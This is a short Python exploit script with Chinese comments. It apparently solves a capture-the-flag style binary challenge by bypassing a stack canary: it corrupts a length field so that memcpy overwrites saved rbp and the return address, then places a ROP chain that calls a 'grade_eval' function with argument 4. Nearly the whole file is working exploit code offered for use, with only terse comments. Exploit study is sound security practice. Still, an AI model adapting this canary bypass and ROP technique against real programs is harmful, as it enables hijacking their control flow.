#!/usr/bin/env python3
# 绕 canary：gets 只写 279 字节（canary 在第 280 字节），碰不到；
# 再把 len 改成 160，memcpy 的目标从 logMsg+160 挪到 rbp，正好盖掉返回地址
import sys
import struct

# expression 前 40 字节会被 memcpy 搬到 rbp，所以直接放 ROP 链
expr = b"A" * 8                                 # saved rbp
expr += struct.pack("<Q", 0x4018a3)             # pop rdi; ret
expr += struct.pack("<Q", 4)
expr += struct.pack("<Q", 0x401677)             # grade_eval
expr += struct.pack("<Q", 0x401834)             # 返回后进 main 的 leave
expr = expr.ljust(128, b"B")

payload = expr
payload += b"C" * 128                           # logMsg 那片，没用
payload += struct.pack("<I", 160)               # len = 0xA0
payload += b"D" * 19                            # 到第 279 字节为止
payload += b"\n"

sys.stdout.buffer.write(payload)
